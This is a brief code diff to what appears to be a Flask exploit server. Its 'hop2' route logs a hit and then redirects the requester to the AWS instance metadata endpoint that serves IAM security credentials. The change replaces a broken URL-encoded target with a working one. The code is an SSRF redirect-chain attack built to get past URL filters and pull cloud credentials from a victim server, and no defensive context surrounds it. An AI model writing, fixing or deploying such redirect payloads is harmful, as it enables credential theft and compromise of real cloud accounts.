@@ -24,7 +24,7 @@ def hop2():
     log_request("HOP2 — REDIRECT FOLLOWED")
     # only now redirect to the actual target
     return redirect(
-        "http%3A%2F%2F169.254.169.254%2F/latest/meta-data/iam/security-credentials/ecsInstanceRole%3Fu%3D65bd5a1857b73643aad556093%26amp%3Bid%3D934e9ffdc5",
+        "http://169.254.169.254//latest/meta-data/iam/security-credentials/",
         code=301
     )
 
